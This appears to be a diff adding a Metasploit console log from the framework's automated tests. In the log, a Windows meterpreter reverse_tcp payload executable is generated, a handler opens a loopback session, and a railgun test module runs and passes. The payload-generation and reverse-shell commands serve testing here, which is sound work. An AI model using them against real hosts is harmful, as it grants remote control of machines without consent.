@@ -1,0 +1,29 @@
+use windows/meterpreter/reverse_tcp
+msf6 post(test/registry) > irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/windowsmeterpreterreverse_tcp_session_tlv_logging20240307-3104-mjavmktxt
+msf6 payload(windows/meterpreter/reverse_tcp) > msf6 payload(windows/meterpreter/reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/windowsmeterpreterreverse_tcp_session_tlv_logging20240307-3104-mjavmktxt
+msf6 payload(windows/meterpreter/reverse_tcp) > generate -o D:/a/_temp/child-process-rb-windows-meterpreter-reverse-tcp20240307-3104-zkchik.exe -f exe AutoVerifySessionTimeout=30 lport=6003 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/windowsmeterpreterreverse_tcp_debug_log20240307-3104-8i145htxt MeterpreterDebugBuild=true
+[*] Writing 73802 bytes to D:/a/_temp/child-process-rb-windows-meterpreter-reverse-tcp20240307-3104-zkchik.exe...
+msf6 payload(windows/meterpreter/reverse_tcp) > to_handler AutoVerifySessionTimeout=30 lport=6003 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/windowsmeterpreterreverse_tcp_debug_log20240307-3104-8i145htxt MeterpreterDebugBuild=true
+[*] Payload Handler Started as Job 2
+msf6 payload(windows/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6003 
+[*] Sending stage (232014 bytes) to 127.0.0.1
+[*] Meterpreter session 3 opened (127.0.0.1:6003 -> 127.0.0.1:49998) at 2024-03-07 09:39:33 +0000
+use test/railgun_reverse_lookups
+msf6 post(test/railgun_reverse_lookups) > run session=3 AddEntropy=true Verbose=true
+[*] Running against session 3
+[*] Session type is meterpreter and platform is windows
+[*] SKIPPED: def test_osx_static (session platform is not osx)
+[*] SKIPPED: def test_linux_static (session platform is not osx)
+[+] should return a constant name given a const and a filter
+[+] should return an error string given an error code
+[*] Testing complete in 0.14 seconds
+[*] Passed: 4; Failed: 0; Skipped: 2
+[*] Post module execution completed
+msf6 post(test/railgun_reverse_lookups) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 3 closed.
+msf6 post(test/railgun_reverse_lookups) > Stopping all jobs...
